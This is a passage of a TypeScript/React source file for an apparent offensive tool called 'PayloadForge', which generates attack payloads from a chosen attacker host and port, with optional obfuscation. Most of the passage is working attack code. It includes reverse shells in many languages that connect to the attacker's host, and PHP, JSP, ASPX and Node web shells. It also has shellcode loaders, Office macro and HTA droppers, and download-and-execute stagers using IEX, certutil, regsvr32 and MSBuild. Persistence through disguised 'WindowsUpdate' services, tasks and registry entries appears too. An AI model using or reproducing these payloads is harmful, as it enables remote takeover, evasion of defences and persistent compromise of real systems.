    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()`
          break
        case 'go':
          rawCode = base + `package main
import ("net";"os/exec")
func main() {
    c, _ := net.Dial("tcp", "${lhost}:${lport}")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c
    cmd.Run()
}`
          break
        case 'raw_c':
          rawCode = base + `#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(${lport});
    sin.sin_addr.s_addr = inet_addr("${lhost}");
    connect(sock, (struct sockaddr*)&sin, sizeof(sin));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
}`
          break
        case 'csharp':
          rawCode = base + `using System;
using System.Net.Sockets;
using System.Diagnostics;
class Program {
    static void Main() {
        TcpClient client = new TcpClient("${lhost}", ${lport});
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        p.StandardInput.WriteLine("whoami");
        p.StandardInput.Flush();
    }
}`
          break
        case 'bash':
          rawCode = base + `#!/bin/bash
bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`
          break
        case 'perl':
          rawCode = base + `#!/usr/bin/perl
use Socket;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(S, sockaddr_in(${lport}, inet_aton("${lhost}")));
open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
exec("/bin/sh -i");`
          break
        case 'ruby':
          rawCode = base + `#!/usr/bin/env ruby
require 'socket'
s = TCPSocket.new("${lhost}", ${lport})
loop do
    cmd = s.gets
    IO.popen(cmd, "r") { |io| s.print io.read }
end`
          break
        default:
          rawCode = base + `// ${type} payload in ${format} format not yet implemented`
      }
      break
    }
    case 'meterpreter': {
      switch (format) {
        case 'csharp':
          rawCode = base + `// Meterpreter C# (Reflective DLL)
// Use with Metasploit handler
// Compile with: csc /target:library /out:payload.dll payload.cs`
          break
        case 'python':
          rawCode = base + `# Meterpreter Python (using pymsf or custom)
# This is a placeholder; real Meterpreter is not available in Python.
# Use Metasploit's python meterpreter via msfvenom.`
          break
        case 'powershell':
          rawCode = base + `# Meterpreter PowerShell via Invoke-Metasploit
# Download and execute meterpreter payload from a remote server.
IEX (New-Object Net.WebClient).DownloadString('http://${lhost}/payload.ps1')`
          break
        default:
          rawCode = base + `// Meterpreter not implemented for ${format}`
      }
      break
    }
    case 'bind_shell': {
      switch (format) {
        case 'powershell':
          rawCode = base + `$listener = New-Object System.Net.Sockets.TcpListener(${lport});
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
# ... similar to reverse shell but accepting connection`
          break
        case 'csharp':
          rawCode = base + `// Bind shell C#
TcpListener listener = new TcpListener(IPAddress.Any, ${lport});
listener.Start();
TcpClient client = listener.AcceptTcpClient();
// ... process commands`
          break
        case 'raw_c':
          rawCode = base + `// Bind shell C
int server = socket(...);
bind(...);
listen(...);
int client = accept(...);
dup2(client, 0); dup2(client, 1); dup2(client, 2);
execve("/bin/sh", NULL, NULL);`
          break
        case 'python':
          rawCode = base + `import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', ${lport}))
s.listen(1)
conn, addr = s.accept()
os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])`
          break
        default:
          rawCode = base + `// Bind shell not implemented for ${format}`
      }
      break
    }
    case 'webshell': {
      switch (format) {
        case 'php':
          rawCode = base + `<?php
if (isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; }
?>`
          break
        case 'javascript':
          rawCode = base + `// Node.js webshell
const http = require('http');
const { exec } = require('child_process');
http.createServer((req, res) => {
    const url = new URL(req.url, 'http://localhost');
    const cmd = url.searchParams.get('cmd');
    if (cmd) {
        exec(cmd, (err, stdout) => res.end(stdout));
    } else res.end('WebShell ready');
}).listen(${lport});`
          break
        case 'python':
          rawCode = base + `#!/usr/bin/env python3
import http.server, subprocess, urllib.parse
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        cmd = query.get('cmd', [''])[0]
        if cmd:
            result = subprocess.check_output(cmd, shell=True)
            self.send_response(200); self.end_headers(); self.wfile.write(result)
        else:
            self.send_response(200); self.end_headers(); self.wfile.write(b'WebShell ready')
http.server.HTTPServer(('0.0.0.0', ${lport}), Handler).serve_forever()`
          break
        case 'jsp':
          rawCode = base + `<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) out.println(line);
}
%>`
          break
        case 'aspx':
          rawCode = base + `<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (cmd != null) {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
}
</script>`
          break
        default:
          rawCode = base + `// Webshell not implemented for ${format}`
      }
      break
    }
    case 'dll_inject': {
      if (format === 'csharp') {
        rawCode = base + `using System;
using System.Runtime.InteropServices;
class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    // ... full implementation
}`
      } else if (format === 'raw_c') {
        rawCode = base + `#include <windows.h>
#include <stdio.h>
int main() {
    unsigned char shellcode[] = { /* ... */ };
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}`
      } else {
        rawCode = base + `// DLL injection not implemented for ${format}`
      }
      break
    }
    case 'shellcode': {
      switch (format) {
        case 'raw_c':
          rawCode = base + `unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
    // ... actual shellcode bytes
};
int main() { ((void(*)())shellcode)(); return 0; }`
          break
        case 'python':
          rawCode = base + `import ctypes
shellcode = bytes([0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00])
libc = ctypes.CDLL('libc.so.6')
exec_mem = libc.valloc(len(shellcode))
ctypes.memmove(exec_mem, shellcode, len(shellcode))
libc.mprotect(exec_mem, len(shellcode), 0x7)
func = ctypes.cast(exec_mem, ctypes.CFUNCTYPE(None))
func()`
          break
        case 'go':
          rawCode = base + `package main
import ("syscall"; "unsafe")
func main() {
    shellcode := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc}
    exec, _ := syscall.Mmap(-1, 0, len(shellcode), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANONYMOUS|syscall.MAP_PRIVATE)
    copy(exec, shellcode)
    syscall.Syscall(uintptr(exec), 0, 0, 0, 0)
}`
          break
        default:
          rawCode = base + `// Shellcode not implemented for ${format}`
      }
      break
    }
    case 'macro': {
      rawCode = base + `Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(""${lhost}"",${lport}); $stream = $client.GetStream(); [byte[]]$b = 0..65535 | %{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }"
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub`
      break
    }
    case 'hta': {
      rawCode = base + `<html>
<head><HTA:APPLICATION ID="oApp" APPLICATIONNAME="htaPayload" /></head>
<script language="JScript">
function exec() {
    var cmd = "powershell -WindowStyle Hidden -Command $client=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream=$client.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$stream.Read($b,0,$b.Length))-ne 0){ $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $sendback=(iex $data 2>&1 | Out-String); $sendback2=$sendback+'PS '+(pwd).Path+'> '; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }";
    new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
}
window.onload = exec;
</script>
<body></body>
</html>`
      break
    }
    case 'reverse_https':
      rawCode = base + `// Reverse HTTPS example (Python with SSL)
import socket, ssl, subprocess, os
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("${lhost}", ${lport}))
ctx = ssl.create_default_context()
ssl_sock = ctx.wrap_socket(sock, server_hostname="${lhost}")
os.dup2(ssl_sock.fileno(), 0); os.dup2(ssl_sock.fileno(), 1); os.dup2(ssl_sock.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])`
      break
    case 'reverse_http':
      rawCode = base + `# Reverse HTTP (Python) using requests
import requests, subprocess, time
while True:
    try:
        r = requests.get(f'http://${lhost}:${lport}/cmd', timeout=5)
        if r.status_code == 200 and r.text:
            out = subprocess.check_output(r.text, shell=True)
            requests.post(f'http://${lhost}:${lport}/result', data=out)
    except: pass
    time.sleep(2)`
      break
    case 'bind_https':
      rawCode = base + `// Bind HTTPS (Python with SSL server)
import socket, ssl, subprocess, os
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', ${lport}))
sock.listen(1)
conn, addr = sock.accept()
ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
ctx.load_cert_chain('cert.pem', 'key.pem')
ssl_conn = ctx.wrap_socket(conn, server_side=True)
os.dup2(ssl_conn.fileno(), 0); os.dup2(ssl_conn.fileno(), 1); os.dup2(ssl_conn.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])`
      break
    case 'java_webshell':
      rawCode = base + `<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) out.println(line);
}
%>`
      break
    case 'aspx_webshell':
      rawCode = base + `<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (cmd != null) {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
}
</script>`
      break
    case 'encrypted_shell':
      rawCode = base + `# AES encrypted reverse shell (Python)
from Crypto.Cipher import AES
import socket, subprocess, os, base64
key = b'0123456789abcdef'
iv = b'1234567890abcdef'
def encrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(data + b' '*(16 - len(data)%16))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("${lhost}", ${lport}))
# ... send/receive encrypted data`
      break
    case 'powershell_encoded':
      rawCode = base + `# Encoded PowerShell command (base64)
$code = '$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$encoded = [Convert]::ToBase64String($bytes)
# Now run: powershell -EncodedCommand $encoded`
      break
    case 'csharp_loader':
      rawCode = base + `using System;
using System.Runtime.InteropServices;
class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    static void Main() {
        byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc };
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}`
      break
    case 'dns_shell':
      rawCode = base + `# DNS shell (Python using dnslib or scapy)
# This is a basic example – actual implementation would be more complex
import socket, subprocess, dns.resolver
def dns_query(host, cmd):
    # encode command in subdomain
    sub = '.'.join(cmd[:10]) + '.domain.com'
    dns.resolver.query(sub, 'A')
# ... implement full protocol`
      break
    case 'icmp_shell':
      rawCode = base + `# ICMP shell (Python using scapy)
from scapy.all import *
def icmp_listen():
    sniff(filter="icmp", prn=lambda p: process_icmp(p))
def send_response(data, src):
    send(IP(dst=src)/ICMP(type="echo-reply")/data)
# ... implement shell`
      break
    case 'smb_shell':
      rawCode = base + `# SMB shell using impacket (Python)
# This would be a psexec-like implementation
# Use smbexec.py or similar tools`
      break
    case 'ssh_shell':
      rawCode = base + `#!/bin/bash
ssh -R ${lport}:localhost:22 user@${lhost}
# Then from your machine: ssh -p ${lport} localhost`
      break
    case 'powershell_plain':
      rawCode = base + `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()`
      break
    case 'bash_reverse':
      rawCode = base + `#!/bin/bash
bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`
      break
    case 'wmi_shell': {
      rawCode = base + `# WMI Shell (PowerShell)
$cred = Get-Credential
$Computer = "${lhost}"
$Command = "cmd.exe /c whoami"
$WMIClient = New-Object System.Management.ManagementClass("Win32_Process")
$WMIClient.Scope = New-Object System.Management.ManagementScope("\\\\$Computer\\root\\cimv2", $cred)
$WMIClient.Scope.Connect()
$WMIClient.Create($Command)`
      break
    }
    case 'winrm_shell': {
      rawCode = base + `# WinRM Shell (PowerShell)
$cred = Get-Credential
$Computer = "${lhost}"
Invoke-Command -ComputerName $Computer -ScriptBlock { whoami } -Credential $cred
# Or:
Enter-PSSession -ComputerName $Computer -Credential $cred`
      break
    }
    case 'cobalt_strike_beacon': {
      rawCode = base + `# Cobalt Strike Beacon (PowerShell Stager)
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString("http://${lhost}:${lport}/payload.ps1")
# Generate actual Beacon using Cobalt Strike Arsenal`
      break
    }
    case 'sliver_beacon': {
      rawCode = base + `# Sliver C2 (PowerShell Stager)
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString("http://${lhost}:${lport}/sliver.ps1")
# Generate actual Sliver implant using sliver-server`
      break
    }
    case 'macos_reverse': {
      rawCode = base + `#!/usr/bin/env python3
import socket, subprocess, os, sys
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("${lhost}", ${lport}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/zsh", "-i"])
if __name__ == "__main__":
    main()`
      break
    }
    case 'msbuild_applocker_bypass': {
      rawCode = base + `<!-- MSBuild AppLocker Bypass - .csproj file -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <Code Type="C#" Language="C#" Source="
      using System;
      using System.Net;
      using System.Diagnostics;
      class Program { static void Main() {
        WebClient wc = new WebClient();
        byte[] payload = wc.DownloadData("http://${lhost}:${lport}/payload.exe");
        Process.Start("C:\\Windows\\Temp\\payload.exe");
      }}
    "/>
  </Target>
</Project>`
      break
    }
    case 'regsvr32_squiblydoo': {
      rawCode = base + `<!-- Squiblydoo SCT File -->
<?XML version="1.0"?>
<scriptlet>
<registration progid="Test" classid="{A1112221-0000-0000-0000-000000000000}">
  <script language="JScript">
    <![CDATA[
      var cmd = new ActiveXObject("WScript.Shell").Run("powershell -WindowStyle Hidden -Command $client=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream=$client.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$stream.Read($b,0,$b.Length))-ne 0){ $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $sendback=(iex $data 2>&1 | Out-String); $sendback2=$sendback+'PS '+(pwd).Path+'> '; $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }", 0, false);
    ]]>
  </script>
</registration>
</scriptlet>
# Run with: regsvr32 /s /u /i:http://${lhost}:${lport}/payload.sct scrobj.dll`
      break
    }
    case 'certutil_downloader': {
      rawCode = base + `# Certutil Downloader (Batch)
certutil -urlcache -f http://${lhost}:${lport}/payload.b64 payload.b64
certutil -decode payload.b64 payload.exe
payload.exe`
      break
    }
    case 'excel4_macro': {
      const psCommand = `powershell -WindowStyle Hidden -Command $client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport}); $stream = $client.GetStream(); [byte[]]$b = 0..65535 | %{0}; while(($i = $stream.Read($b, 0, $b.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }`
      const excelSafe = psCommand.replace(/\$/g, '$$$$')
      rawCode = base + `# Excel 4.0 Macro (XLM)
=EXEC("${excelSafe}")
=HALT()`
      break
    }
    case 'dde_injection': {
      rawCode = base + `# DDE Injection Field
{ DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k mshta.exe http://${lhost}:${lport}/payload.hta" }
# Or simpler: { DDEAUTO "c:\\\\windows\\\\system32\\\\mshta.exe" "http://${lhost}:${lport}/payload.hta" }
# Insert as Word/Excel field`
      break
    }
    case 'donut_shellcode': {
      rawCode = base + `// Donut Shellcode (C# Loader)
using System;
using System.Runtime.InteropServices;
class Program {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    static void Main() {
        byte[] shellcode = new byte[] { /* DONUT GENERATED SHELLCODE */ };
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
# Generate with: donut.exe -a 2 -f 1 -i payload.exe`
      break
    }
    case 'com_hijack': {
      rawCode = base + `// COM Hijacking (Registry Modification)
// Target: {GUID} - find COM object to hijack
// Registry: HKCR\\CLSID\\{GUID}\\InprocServer32
// Set value to malicious DLL path

# PowerShell Example:
$regPath = "HKCR:\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32"
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\\Windows\\Temp\\malicious.dll"
`
      break
    }
    case 'task_scheduler_persistence': {
      rawCode = base + `# Task Scheduler Persistence (PowerShell)
$action = New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "SYSTEM"
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Password ""

# Or using schtasks:
schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /sc onlogon /ru SYSTEM`
      break
    }
    case 'registry_persistence': {
      rawCode = base + `# Registry Run Persistence (PowerShell)
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $regPath -Name "LegitApp" -Value "C:\\Users\\Public\\payload.exe"

# For SYSTEM persistence:
$regPath = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $regPath -Name "SystemApp" -Value "C:\\Windows\\Temp\\payload.exe"`
      break
    }
    case 'service_persistence': {
      rawCode = base + `# Service Persistence (PowerShell)
$serviceName = "WindowsUpdateService"
$binaryPath = "C:\\Windows\\Temp\\payload.exe"
New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName "Windows Update Service" -StartupType Automatic

# Or using sc:
sc create WindowsUpdateService binPath= "C:\\Windows\\Temp\\payload.exe" start= auto`
      break
    }
    default:
      rawCode = base + `// ${type} payload not yet implemented`
  }

  return obfuscateCode(rawCode, format, obfuscation)
}

// ─── Main Component ───────────────────────────────────────
export default function PayloadForge() {
  const [activeTab, setActiveTab] = useState<'generator' | 'encyclopedia'>('encyclopedia')
  const [selectedPayload, setSelectedPayload] = useState<PayloadType>('reverse_shell')
  const [format, setFormat] = useState<OutputFormat>('python')
  const [lhost, setLhost] = useState('10.10.14.5')
  const [lport, setLport] = useState(4444)
  const [obfuscation, setObfuscation] = useState<ObfuscationLevel>('medium')
  const [generatedPayload, setGeneratedPayload] = useState('')
  const [showRaw, setShowRaw] = useState(false)
  const [expandedPayloads, setExpandedPayloads] = useState<Set<PayloadType>>(new Set())
  const [copyStatus, setCopyStatus] = useState<'idle' | 'success' | 'error' | 'manual'>('idle')
  const [lhostError, setLhostError] = useState<string | null>(null)
  const [lportError, setLportError] = useState<string | null>(null)
  const [showPayloadInfo, setShowPayloadInfo] = useState(true)
  
  const currentPayloadInfo = PAYLOAD_BY_TYPE[selectedPayload]
  
  const saveTimeoutRef = useRef<TimerHandle | null>(null)
  const copyTimerRef = useRef<TimerHandle | null>(null)
  const manualCopyRef = useRef<HTMLPreElement>(null)
  const initRef = useRef(false)

  // Load config from localStorage ONCE (mount only)
  useEffect(() => {
    if (initRef.current) return
    initRef.current = true
    
    type SavedConfig = {
      lhost?: unknown
      lport?: unknown
      selectedPayload?: unknown
      format?: unknown
      obfuscation?: unknown
    }

    const isPayloadType = (value: unknown): value is PayloadType =>
      typeof value === 'string' && value in PAYLOAD_BY_TYPE

    const isOutputFormat = (value: unknown): value is OutputFormat =>
      typeof value === 'string' && [
        'powershell','csharp','python','go','raw_c','vba','javascript',
        'php','jsp','aspx','bash','perl','ruby','batch','hta','xml','inf'
      ].includes(value)

    const isObfuscationLevel = (value: unknown): value is ObfuscationLevel =>
      typeof value === 'string' && ['none','light','medium','heavy'].includes(value)

    const saved = localStorage.getItem(STORAGE_KEY)
    if (!saved) return
    
    try {
      const config = JSON.parse(saved) as SavedConfig
      
      if (typeof config.lhost === 'string') setLhost(config.lhost)
      if (typeof config.lport === 'number' && config.lport >= 1 && config.lport <= 65535) {
        setLport(config.lport)
      }

      const selectedPayloadValue = config.selectedPayload
      const hasValidPayload = isPayloadType(selectedPayloadValue)
      if (hasValidPayload) {
        setSelectedPayload(selectedPayloadValue)
      }
      
      const payload = hasValidPayload
        ? PAYLOAD_BY_TYPE[selectedPayloadValue]
        : PAYLOAD_BY_TYPE[selectedPayload]

      if (isOutputFormat(config.format) && payload.supportedFormats.includes(config.format)) {
        setFormat(config.format)
      } else if (payload.supportedFormats.length > 0) {
        setFormat(payload.supportedFormats[0])
      }
      
      if (isObfuscationLevel(config.obfuscation)) setObfuscation(config.obfuscation)
    } catch (err) {
      console.error('payloadforge_config: failed to parse saved config:', err)
    }
  }, [])

  // Debounced save to localStorage
  useEffect(() => {
    if (!initRef.current) return
    
    if (saveTimeoutRef.current) {
      clearTimeout(saveTimeoutRef.current)
    }
    
    saveTimeoutRef.current = setTimeout(() => {
      try {
        localStorage.setItem(STORAGE_KEY, JSON.stringify({ 
          lhost, 
          lport, 
          selectedPayload, 
          format,
          obfuscation
        }))
      } catch (err) {
        if (err instanceof DOMException && err.name === 'QuotaExceededError') {
          console.error('payloadforge_config: localStorage quota exceeded')
        } else {
          console.error('payloadforge_config: save failed', err)
        }
      }
    }, 500)
    
    return () => {
      if (saveTimeoutRef.current) {
        clearTimeout(saveTimeoutRef.current)
      }
    }
  }, [lhost, lport, selectedPayload, format, obfuscation])

  const handlePayloadChange = (newType: PayloadType) => {
    setSelectedPayload(newType)
    const info = PAYLOAD_BY_TYPE[newType]
    if (info) {
      if (info.requiresLport) setLport(info.defaultPort)
      if (!info.supportedFormats.includes(format)) {
        setFormat(info.supportedFormats[0])
      }
    }
  }

  const handleLportChange = (value: string) => {
    if (value === '') {
      setLportError(null)
      return
    }
    const parsed = parseInt(value, 10)
    if (isNaN(parsed)) {
      setLportError('Invalid port number')
      return
    }
    if (parsed < 1 || parsed > 65535) {
      setLportError('Port must be 1-65535')
      return
    }
    setLport(parsed)
    setLportError(null)
  }

  const handleLhostChange = (value: string) => {
    const trimmed = value.trim()
    if (trimmed === '') {
      setLhostError(null)
      return
    }
    
    if (trimmed === 'localhost') {
      setLhost(trimmed)
      setLhostError(null)
      return
    }
    
    const ipv4Match = trimmed.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)
    if (ipv4Match) {
      const octets = [ipv4Match[1], ipv4Match[2], ipv4Match[3], ipv4Match[4]].map(Number)
      if (octets.every(o => o >= 0 && o <= 255)) {
        setLhost(trimmed)
        setLhostError(null)
        return
      }
      setLhostError(`Invalid IPv4: "${trimmed}" — octets must be 0-255`)
      return
    }
    
    if (trimmed.includes(':') && !/\s/.test(trimmed) && /^[0-9a-fA-F:]+$/.test(trimmed)) {
      setLhost(trimmed)
      setLhostError(null)
      return
    }
    
    if (/^[a-zA-Z0-9]([a-zA-Z0-9_-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9_-]{0,61}[a-zA-Z0-9])?)*$/.test(trimmed)) {
      setLhost(trimmed)
      setLhostError(null)
      return
    }
    
    setLhostError(`Invalid LHOST: "${trimmed}" — use IPv4 (10.0.0.1), IPv6, or hostname`)
  }

  const copyToClipboard = async (text: string) => {
    if (copyTimerRef.current) {
      clearTimeout(copyTimerRef.current)
      copyTimerRef.current = null
    }
    
    try {
      await navigator.clipboard.writeText(text)
      setCopyStatus('success')
      copyTimerRef.current = setTimeout(() => setCopyStatus('idle'), 2000)
    } catch (e) {
      const textarea = document.createElement('textarea')
      textarea.value = text
      textarea.style.position = 'fixed'
      textarea.style.opacity = '0'
      textarea.style.left = '-9999px'
      document.body.appendChild(textarea)
      textarea.focus()
      textarea.select()
      let succeeded = false
      try {
        succeeded = document.execCommand('copy')
      } catch {}
      document.body.removeChild(textarea)
      
      if (!succeeded) {
        setCopyStatus('manual')
        return
      } else {
        setCopyStatus('success')
        copyTimerRef.current = setTimeout(() => setCopyStatus('idle'), 2000)
      }
    }
  }

  const downloadPayload = () => {
    if (!generatedPayload) return
    const mimeType = FORMAT_MIMES[format] ?? 'application/octet-stream'
    const blob = new Blob([generatedPayload], { type: mimeType })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
